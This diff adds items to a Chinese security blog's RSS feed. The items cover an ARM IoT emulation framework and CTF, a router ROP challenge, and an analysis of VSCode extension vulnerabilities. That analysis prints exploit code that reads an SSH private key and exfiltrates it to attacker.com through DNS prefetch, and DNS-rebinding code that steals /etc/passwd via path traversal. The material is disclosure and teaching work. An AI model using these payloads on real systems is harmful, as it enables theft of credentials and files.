@@ -7,7 +7,192 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Fri, 08 Aug 2025 03:01:33 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 09 Aug 2025 00:24:47 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>ARM-X IoT漏洞利用框架与CTF挑战赛</title>
+        <link>http://localhost:1313/p/arm-x-iot%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E4%B8%8Ectf%E6%8C%91%E6%88%98%E8%B5%9B/</link>
+        <pubDate>Sat, 09 Aug 2025 00:24:47 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/arm-x-iot%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E4%B8%8Ectf%E6%8C%91%E6%88%98%E8%B5%9B/</guid>
+        <description>&lt;h1 id=&#34;arm-x与全新物联网ctf挑战赛&#34;&gt;ARM-X与全新物联网CTF挑战赛
+&lt;/h1&gt;&lt;p&gt;几天前，我发布了ARM-X固件仿真框架。目标是构建尽可能接近真实物联网设备的虚拟环境。ARM-X具有多种应用场景：可用于物联网设备仿真与渗透测试，也用于ARM IoT漏洞实验室的漏洞开发教学，还能用于物联网目标模糊测试和CTF挑战赛的搭建！&lt;/p&gt;
+&lt;h2 id=&#34;arm-x预览虚拟机&#34;&gt;ARM-X预览虚拟机
+&lt;/h2&gt;&lt;p&gt;2019年10月23日发布的ARM-X预览版包含VMware虚拟机镜像，采用Alpine Linux作为主机系统（纯粹因为无法忍受systemd）。预览版预装了两个仿真物联网设备：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DVAR：Damn Vulnerable ARM Router（最初以TinysploitARM名称发布）&lt;/li&gt;
+&lt;li&gt;Trivision 227WF IP Camera&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;arm-x-ctf挑战赛1&#34;&gt;ARM-X CTF挑战赛#1
+&lt;/h2&gt;&lt;p&gt;正如预期，Trivision IP Camera存在严重漏洞。目前已知三个漏洞（可能还有更多隐藏漏洞）。首个提交有效漏洞利用和技术分析报告的参赛者，将获得我特别准备的Ringzer0「0-day礼盒」！&lt;/p&gt;
+&lt;p&gt;未来几天，我将陆续发布调试技巧：包括使用gdb/gdbserver进行ARM-X调试，以及strace/ltrace等动态分析工具的使用方法。关注@therealsaumil获取最新动态。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;description-damn-vulnerable-arm-routerdvar发布灯光服务程序lightsrv的栈溢出rop挑战需绕过xn保护获取shell文章包含进程内存布局等关键线索适合arm漏洞开发进阶练习&#34;&gt;title: &amp;ldquo;DVAR路由器ROP挑战赛：附加关卡解锁！&amp;rdquo;
+tags: [ARM, ROP, 漏洞开发, 物联网安全]
+authors: qife
+description: &amp;ldquo;Damn Vulnerable ARM Router(DVAR)发布灯光服务程序(lightsrv)的栈溢出ROP挑战，需绕过XN保护获取shell。文章包含进程内存布局等关键线索，适合ARM漏洞开发进阶练习。&amp;rdquo;
+&lt;/h2&gt;&lt;h1 id=&#34;dvar-rop挑战赛---附加关卡解锁&#34;&gt;DVAR ROP挑战赛 - 附加关卡解锁！
+&lt;/h1&gt;&lt;p&gt;在发布Damn Vulnerable ARM Router时，我曾承诺公布附加挑战。现在@JatanKRaval完成了首个栈溢出练习，正式解锁附加关卡！&lt;/p&gt;
+&lt;p&gt;挑战第二部分需要利用&amp;quot;/usr/bin/lightsrv&amp;quot;（交通信号灯服务）的栈溢出漏洞。该服务随系统启动，监听8080端口。你的任务是：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;找到lightsrv的缓冲区溢出触发点&lt;/li&gt;
+&lt;li&gt;使程序崩溃并达到pc=0x41414140&lt;/li&gt;
+&lt;li&gt;构建完整ROP链（已启用XN保护！）&lt;/li&gt;
+&lt;li&gt;获取可交互shell&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;关键线索：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploitlab-DVAR:~# ps
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;245&lt;/span&gt; root &lt;span class=&#34;m&#34;&gt;656&lt;/span&gt; S /usr/bin/miniweb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;246&lt;/span&gt; root &lt;span class=&#34;m&#34;&gt;640&lt;/span&gt; S /usr/bin/lightsrv &amp;lt;---&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;292&lt;/span&gt; root &lt;span class=&#34;m&#34;&gt;1016&lt;/span&gt; S -ash
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;321&lt;/span&gt; root &lt;span class=&#34;m&#34;&gt;1012&lt;/span&gt; R ps
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploitlab-DVAR:~# cat /proc/&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;pidof lightsrv&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;/maps
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00010000-00012000 r-xp &lt;span class=&#34;m&#34;&gt;00000000&lt;/span&gt; 08:00 &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; /usr/bin/lightsrv
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00022000-00023000 rw-p &lt;span class=&#34;m&#34;&gt;00002000&lt;/span&gt; 08:00 &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; /usr/bin/lightsrv
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;40000000-40064000 r-xp &lt;span class=&#34;m&#34;&gt;00000000&lt;/span&gt; 08:00 &lt;span class=&#34;m&#34;&gt;185&lt;/span&gt; /lib/libc.so
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...（完整内存映射）
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;未体验过DVAR的用户可从以下地址下载：
+&lt;a class=&#34;link&#34; href=&#34;http://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;description-dvar是基于qemu仿真的arm路由器环境运行存在漏洞的web服务包含474mb-vmware镜像下载链接和sha256校验值适合arm栈溢出漏洞开发训练&#34;&gt;title: &amp;ldquo;Damn Vulnerable ARM Router(DVAR)发布&amp;rdquo;
+tags: [ARM, 漏洞开发, 路由器安全]
+authors: qife
+description: &amp;ldquo;DVAR是基于QEMU仿真的ARM路由器环境，运行存在漏洞的web服务，包含47.4MB VMware镜像下载链接和SHA256校验值，适合ARM栈溢出漏洞开发训练。&amp;rdquo;
+&lt;/h2&gt;&lt;h1 id=&#34;dvar---damn-vulnerable-arm-router&#34;&gt;DVAR - Damn Vulnerable ARM Router
+&lt;/h1&gt;&lt;p&gt;DVAR是模拟Linux环境的ARM路由器，运行存在漏洞的web服务，可用于锻炼ARM栈溢出漏洞利用能力。&lt;/p&gt;
+&lt;p&gt;DVAR运行在tinysploitARM VMware虚拟机中，通过QEMU完整模拟ARM路由器环境。解压ZIP文件后通过tinysploitARM.vmx启动虚拟机，控制台将显示IP地址和默认URL。通过主机浏览器访问该URL即可开始挑战，虚拟网卡设置为NAT模式。&lt;/p&gt;
+&lt;p&gt;挑战目标是编写针对DVAR路由器web服务的栈溢出漏洞利用程序。DVAR还包含附加挑战，关注@therealsaumil获取通知。&lt;/p&gt;
+&lt;p&gt;下载地址：exploitlab_DVAR_tinysploitARM.zip（47.4MB VMware镜像）
+SHA256: bc6eb66b7f5c0c71ca418c809213eb452e3fbf90654856ebb0591e164d634e2b&lt;/p&gt;
+&lt;p&gt;DVAR最初是作为ARM IoT漏洞实验室的预备练习而开发。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>逃逸配置错误的VSCode扩展 - 技术漏洞分析与利用</title>
+        <link>http://localhost:1313/p/%E9%80%83%E9%80%B8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E7%9A%84vscode%E6%89%A9%E5%B1%95-%E6%8A%80%E6%9C%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
+        <pubDate>Fri, 08 Aug 2025 22:56:04 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E9%80%83%E9%80%B8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E7%9A%84vscode%E6%89%A9%E5%B1%95-%E6%8A%80%E6%9C%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
+        <description>&lt;h2 id=&#34;vscode-webviews基础&#34;&gt;VSCode Webviews基础
+&lt;/h2&gt;&lt;p&gt;在深入漏洞之前，需要理解VSCode扩展的结构。VSCode是基于Electron的应用程序，具有访问文件系统和执行任意shell命令的权限，扩展拥有同等权限。这意味着如果攻击者能在扩展中执行JavaScript（例如通过XSS漏洞），就能完全控制系统。&lt;/p&gt;
+&lt;p&gt;作为防御XSS漏洞的纵深保护措施，扩展必须在沙盒化的Webview中创建UI面板。这些Webview无法访问NodeJS API（这是主扩展读取文件和运行shell命令的途径）。Webview可通过以下选项进一步限制：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;enableScripts&lt;/code&gt;：设为false可阻止Webview执行JavaScript。多数扩展需要设为true。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;localResourceRoots&lt;/code&gt;：限制Webview只能访问指定目录的文件。默认为当前工作区目录和扩展文件夹。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;内容安全策略(CSP)&lt;/code&gt;：通过Webview HTML源中的&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;default-src &#39;none&#39;;&amp;quot;&amp;gt;&lt;/code&gt;等标签限制内容加载源。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;漏洞1microsoft-sarif查看器的htmljavascript注入&#34;&gt;漏洞1：Microsoft SARIF查看器的HTML/JavaScript注入
+&lt;/h2&gt;&lt;p&gt;SARIF查看器扩展在渲染分析结果描述时，使用&lt;code&gt;ReactMarkdown&lt;/code&gt;组件且&lt;code&gt;escapeHtml&lt;/code&gt;设为false，导致攻击者可通过控制SARIF文件的markdown字段注入任意HTML/JavaScript。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;利用链：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;通过恶意构造的SARIF文件注入&lt;code&gt;&amp;lt;img onerror&amp;gt;&lt;/code&gt;触发XSS&lt;/li&gt;
+&lt;li&gt;由于&lt;code&gt;localResourceRoots&lt;/code&gt;配置为允许访问整个磁盘（包括z:盘），可通过&lt;code&gt;fetch(&amp;quot;vscode-resource://...&amp;quot;)&lt;/code&gt;读取任意文件&lt;/li&gt;
+&lt;li&gt;受限的CSP阻止直接外传数据，但通过&lt;code&gt;&amp;lt;link rel=&amp;quot;dns-prefetch&amp;quot;&amp;gt;&lt;/code&gt;标签利用DNS预取泄露文件内容（将文件内容编码在子域名中）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 示例：窃取用户SSH私钥的完整利用代码
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sshKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;vscode-resource:///home/user/.ssh/id_rsa&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hexKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;btoa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sshKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hexKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;chunk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hexKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;innerHTML&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&amp;lt;link rel=&amp;#34;dns-prefetch&amp;#34; href=&amp;#34;//&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;chunk&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;.attacker.com&amp;#34;&amp;gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;漏洞2microsoft-live-preview扩展的html注入&#34;&gt;漏洞2：Microsoft Live Preview扩展的HTML注入
+&lt;/h2&gt;&lt;p&gt;该扩展创建本地HTTP服务器(3000端口)预览HTML文件，其Webview中的&lt;code&gt;link-hover-start&lt;/code&gt;消息处理程序直接将消息内容设置为&lt;code&gt;innerHTML&lt;/code&gt;而未消毒，导致HTML注入。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;绕过CSP限制的技巧：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用&lt;code&gt;srcdoc iframe&lt;/code&gt;执行JavaScript（与父窗口同源）&lt;/li&gt;
+&lt;li&gt;CSP采用nonce-based script-src，但nonce由不安全的&lt;code&gt;Math.random()&lt;/code&gt;生成&lt;/li&gt;
+&lt;li&gt;尝试通过DOM元素注入、nonce暴力破解、状态恢复等方式绕过，最终因不同iframe间的算法状态隔离未能成功&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;漏洞3live-preview本地http服务器的路径遍历&#34;&gt;漏洞3：Live Preview本地HTTP服务器的路径遍历
+&lt;/h2&gt;&lt;p&gt;服务器解析URL时存在逻辑缺陷：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器将&lt;code&gt;?../../etc/passwd?AAA&lt;/code&gt;的&lt;code&gt;?&lt;/code&gt;后视为查询参数&lt;/li&gt;
+&lt;li&gt;服务器用&lt;code&gt;lastIndexOf(&#39;?&#39;)&lt;/code&gt;分割，导致路径被解析为&lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;两种利用场景：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;用户预览恶意HTML文件时直接窃取文件&lt;/li&gt;
+&lt;li&gt;结合DNS重绑定攻击：当扩展在后台运行时，用户仅访问恶意网站即可触发漏洞（无需直接预览文件）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// DNS重绑定攻击核心代码
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;attackerServer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;7f000001.c0a80d80.rbndr.us&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 在127.0.0.1和攻击者IP间切换
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;setInterval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`http://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;attackerServer&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;/?../../../../etc/passwd?`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;then&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;then&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`http://attacker.com/?q=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;btoa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;webview安全配置建议&#34;&gt;Webview安全配置建议
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;严格CSP&lt;/strong&gt;：从&lt;code&gt;default-src &#39;none&#39;&lt;/code&gt;开始，避免&lt;code&gt;unsafe-inline&lt;/code&gt;，使用加密强度高的nonce&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;限制localResourceRoots&lt;/strong&gt;：仅允许访问扩展安装目录&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;安全的postMessage处理&lt;/strong&gt;：防范命令注入等漏洞&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HTTP服务器防护&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;使用标准URL解析库&lt;/li&gt;
+&lt;li&gt;路径规范化后二次验证&lt;/li&gt;
+&lt;li&gt;随机端口+端口映射防止DNS重绑定&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;永远不要将用户输入直接赋给innerHTML&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;时间线&#34;&gt;时间线
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;2022年8月12日：报告SARIF查看器漏洞&lt;/li&gt;
+&lt;li&gt;2022年9月7日：报告Live Preview的两个漏洞&lt;/li&gt;
+&lt;li&gt;所有漏洞均在1个月内修复，其中CVE-2022-41042获得$7,500奖金&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
